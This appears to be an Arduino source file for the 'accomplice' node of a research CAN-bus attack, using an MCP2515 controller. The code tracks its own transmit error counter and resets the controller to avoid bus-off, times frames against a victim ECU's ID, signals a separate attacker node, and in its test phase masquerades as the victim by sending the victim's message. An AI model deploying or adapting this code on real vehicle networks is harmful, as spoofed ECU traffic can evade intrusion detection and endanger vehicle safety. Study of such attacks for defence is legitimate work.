#include <SPI.h>
#include "mcp_can.h"

const int SPI_CS_PIN = 9;
MCP_CAN CAN(SPI_CS_PIN); 


#include "duet.h"

int accompliceCounter = 0; // <3 means go passive/garbage. 1 means wait new message to time, 2 means time, >=3 means accomplice, cycle at 20
int lastTEC=0; 
int bufToCheck[] = {0,1,2};
bool syncRequired = false;
bool noTXReq = true;

void setup() {
  commonSetup();
  disableOneShot();
  startCleanTimer();
  for (int i=0;i<2;i++)  CAN.init_Mask(i, 0, 0x3ff);
  CAN.init_Filt(0, 0, victimID);
  CAN.init_Filt(1, 0, victimID);
  CAN.init_Filt(2, 0, phaseChangeToTestID);
  CAN.init_Filt(3, 0, phaseChangeToTestID);
  CAN.init_Filt(4, 0, phaseChangeToTrainID);
  CAN.init_Filt(5, 0, phaseChangeToTrainID);
  
  for (int i=0; i<3; i++)
    setWakeupTimer((uint64_t)(accomplice_periods[i]*1000), &(accomplice_nextWakeupAtOverflows[i]), &(accomplice_nextWakeupAtCounter[i]));
  for (int i=3; i<6; i++)
    setWakeupTimer((uint64_t)(accomplice_periods[i]*1000 - 5000), &(accomplice_nextWakeupAtOverflows[i]), &(accomplice_nextWakeupAtCounter[i]));
  if (!trainingPhase) accompliceCounter=3;
}

void loop() {
  if (!syncRequired && accompliceTEC>50 && lastTEC>accompliceTEC){
    if (noTXPending(bufToCheck,3)){
      int filterIDs[3] = {victimID, phaseChangeToTestID, phaseChangeToTrainID};
      resetCANController(filterIDs,3);
      accompliceTEC = readTEC();
      noTXReq = true;
      emptyBuffers(); 
    }
  }
  
  while (CAN_MSGAVAIL == CAN.checkReceive()){
    long canID = readMsgID();
    if (canID==victimID && syncRequired){
//      printTEC();
      for (int i=0; i<3; i++){
        setWakeupTimer((uint64_t)(accomplice_periods[i]*1000 - startTime - 5000), &(accomplice_nextWakeupAtOverflows[i]), &(accomplice_nextWakeupAtCounter[i]));
      }
      for (int i=3; i<6; i++){
        setWakeupTimer((uint64_t)(accomplice_periods[i]*1000 - startTime), &(accomplice_nextWakeupAtOverflows[i]), &(accomplice_nextWakeupAtCounter[i]));
      }
      syncRequired = false;
    } else if (canID==phaseChangeToTestID){
      trainingPhase = false;
      syncRequired = false;
      accompliceCounter=3;
      setupPhase();
      Serial.println("Test Phase: Accomplice sending preceded IDs and masquerading Victim");
    } else if (canID==phaseChangeToTrainID){
      trainingPhase = true;
      syncRequired = false;
      accompliceCounter=3;
      setupPhase();
      Serial.println("Train Phase: Accomplice only sending preceded IDs");
    }
  }

  for (int i=0; i<accomplice_numIDs; i++){
    if (accomplice_sendIDs[i]){
      if (shouldWakeup(accomplice_nextWakeupAtOverflows[i],
                accomplice_nextWakeupAtCounter[i])){
        unsigned char* msgToSend = chooseDataToSend(accomplice_IDs[i]);
        int res = sendInParticularBuf(accomplice_IDs[i], msgToSend, particularBufs[i]);
        if (res==CAN_FAILTX) continue;
        setWakeupTimer((uint64_t)(accomplice_periods[i]*1000), &(accomplice_nextWakeupAtOverflows[i]), &(accomplice_nextWakeupAtCounter[i]), false);
        lastTEC = accompliceTEC;
        accompliceTEC = readTEC();
        if (i==4 && trainingPhase) {
//          Serial.println(accompliceTEC);
          accompliceCounter++;
          if (accompliceCounter==2) {
            emptyBuffers();
            syncRequired = true;
          } else if (accompliceCounter==12){
            for (int i=3; i<5; i++){
              setWakeupTimer((uint64_t)(accomplice_periods[i]*1000 - 3000), &(accomplice_nextWakeupAtOverflows[i]), &(accomplice_nextWakeupAtCounter[i]));
            }
          } else if (accompliceCounter==13){
            emptyBuffers();
            syncRequired = true;
            accompliceCounter=3;
          }
        }
      }
    }
  }
}

unsigned char * chooseDataToSend(long canID){
  if (accompliceCounter<3 || accompliceCounter>=12){
    if(canID==precedeID1) return accompliceSignalToattackerMsg;
  } else {
    if(canID==precedeID1 || canID==precedeID3) return accompliceSignalToattackerMsg;
  }
  if (canID==victimID || canID==accompliceID) return victimMsg;
  return accompliceBenignMsg;
}
